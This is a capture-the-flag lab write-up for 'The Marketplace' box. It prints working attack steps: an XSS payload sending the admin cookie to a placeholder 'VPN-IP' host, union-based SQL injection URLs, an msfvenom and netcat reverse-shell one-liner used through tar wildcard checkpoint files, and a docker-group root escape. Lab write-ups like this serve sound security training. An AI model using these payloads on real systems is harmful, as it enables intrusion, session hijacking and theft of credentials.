---
layout: default
title : muzec - The Marketplace Writeup
---

The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.

Can you take advantage of this and will you be able to gain root access on his server?

![Image](https://imgur.com/XMqo1bu.png)

Let Get started we always start with an Nmap Scan.

# Nmap

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-01 06:05 EST
Nmap scan report for 10.10.161.93
Host is up (0.16s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.46 seconds
```

We have three open ports interesting i always like seeing ssh port which is the 22 open lol ok let let enumerate port 80 let make it quick.

![Image](https://imgur.com/lJPJqro.png)

A Marketplace store a simple webpage ok let check the robots.txt ok we got only /admin i don't need to run a dirbuster, gobuster on the page to burst some directory it look pretty clean ok let try to check port 32768 node.js but it the same with port 80.

![Image](https://imgur.com/sTRZJg2.png)

So i go back to try to accesss the admin page but i get a blow lol yea.


![Image](https://imgur.com/Xhv8uCb.png)

Ok what to do what to do so let try the normal login page i try using admin/admin for both username and password but no user was found ok i try looking around so we found a sign up page.

![Image](https://imgur.com/XZMsnEZ.png)

![Image](https://imgur.com/GdiuuWF.png)

Cool let log in with the new credentials we just created.

![Image](https://imgur.com/UoEIFV4.png)

I check messages it was empty so i try looking around back to the homepage i click on one the item.

![Image](https://imgur.com/Rq4kzSN.png)

So we can contact the listing author wow but WTF am i going to contact the author telling him to send me the admin creds what a joke lol ok we can see report listing to admin let see what that do.

![Image](https://imgur.com/dImyOGs.png)

So i file a report in a few min i got a reply back from the admin.

![Image](https://imgur.com/UmsQt5O.png)

```From system Thank you for your report. We have reviewed the listing and found nothing that violates our rules.```

Cool the first thing that come to my mind is can i steal the admin cookie is the website vulnerable to XSS no harm in tring i guess so i try to create my own listing with a XSS payload.

```</p><script>window.location = 'http://VPN-IP/page?param=' + document.cookie </script><p>```

![Image](https://imgur.com/XwRiodk.png)

After creating your listing you will get unable to connect don't panic just go back to the homepage.

![Image](https://imgur.com/ntKVyl5.png)

Going back to the homepage we see our listing.

![Image](https://imgur.com/pMF8kVW.png)

Cool so what next to do is to start an Ncat listener on port 80.

![Image](https://imgur.com/uQS3lRO.png)

Ok now let report our listing to the admin yes i know we can't access our listing we get unable to connect what to is to note the id yes number of the listing we have two listing on the website already so we are the three listing which is 3.

```http://IP/report/3```

![Image](https://imgur.com/kWXwM0n.png)

Ok let click on report.

![Image](https://imgur.com/UOsOEbT.png)

So i refresh the messages.

![Image](https://imgur.com/WT6yUsd.png)

```From system Thank you for your report. We have been unable to review the listing at this time. Something may be blocking our ability to view it, such as alert boxes, which are blocked in our employee's browsers.```

Cool let go back to our Ncat listener to see which fish we just caught on the hook.

![Image](https://imgur.com/LOnuLXF.png)

Cool we have the admin cookie what to do now is to edit our cookie to put the admin cookie we can use cookie editor for that.

![Image](https://imgur.com/9Dmmvqq.png)

We edit the cookie value and save refreshing the page boom we have are in.

![Image](https://imgur.com/VK3JNVm.png)

We have the first flag cool let enumerate more.

![Image](https://imgur.com/jBaIIex.png)

I know what you are thinking yes it vulnerable to SQLI so i got stuck here for some time i try dumping the database with sqlmap but no luck so i try doing it manually so i try checking the version first.

```http://IP/admin?user=-1+union+select+version(),2,3,4```

![Image](https://imgur.com/CKFpgrG.png)

```http://IP/admin?user=-1+union+select+(SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),2,3,4```

![Image](https://imgur.com/G3KUZRE.png)

```http://IP/admin?user=-1+union+select+(SELECT+group_concat(column_name)+from+information_schema.columns+where+table_schema=database()),2,3,4```

![Image](https://imgur.com/EavVXwZ.png)

Do a little research on your own to dump the right database here.

![Image](https://imgur.com/DABGNSF.png)

So we have the credentials to log in ssh let hit it.

![Image](https://imgur.com/0Crv2Na.png)

Cool we are in let get the second flag.

![Image](https://imgur.com/pKQoVKS.png)

I always check sudo so let move to the next step so i check ```sudo -l```.

![Image](https://imgur.com/L6BAoRi.png)

Yes privilege escalation to michael cool so let exploit some tar file.

Exploiting a tar file to get a shell is pretty simple just folloow my steps now open a new terminal.

```msfvenom -p cmd/unix/reverse_netcat lhost=VPN-IP lport=1337 R```

![Image](https://imgur.com/EbvzidP.png)

After creating our payload let go back to the victim machine and type;


```echo "mkfifo /tmp/ahikccu; nc VPN IP 1337 0</tmp/ahikccu | /bin/sh >/tmp/ahikccu 2>&1; rm /tmp/ahikccu" > shell.sh```

```chmod 777 shell.sh```

```echo "" > "--checkpoint-action=exec=sh shell.sh"```

```echo "" > --checkpoint=1```

![Image](https://imgur.com/sIDLttv.png)

Now let open another terminal to start an Ncat listener on port 1337.

![Image](https://imgur.com/OTBjWnC.png)

Now let go back to the first terminal and type;

```sudo -u michael /opt/backups/backup.sh```

![Image](https://imgur.com/sb7drKn.png)

Going back to our Ncat listener we can see we have shell with user micheal.

![Image](https://imgur.com/ARTNs0i.png)

We can spawn a TTY shell with ```python -c 'import pty; pty.spawn ("/bin/bash")'``` to make our work more clean.

Privilege escalation to get root typing ```id```  we can see docker in the group of the user micheal since we have access to the user which is a part of the docker group then it is the same as to give constant root access without any password. 

![Image](https://imgur.com/4fbG1Oc.png)

```docker run -v /etc/:/mnt -it alpine```

We ran the command shown below, this command obtains the alpine image from the Docker Hub Registry and runs it. The –v parameter specifies that we want to create a volume in the Docker instance. The –it parameters put the Docker into the shell mode rather than starting a daemon process. The instance is set up to mount the root filesystem of the target machine to the instance volume, so when the instance starts it immediately loads a chroot into that volume. This gives us the root of the machine. After running the command, we traverse into the /mnt directory and found out root.txt.

![Image](https://imgur.com/dBeQFR4.png)

Boom and we are root, box rooted we can get our root.txt in the root folder.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
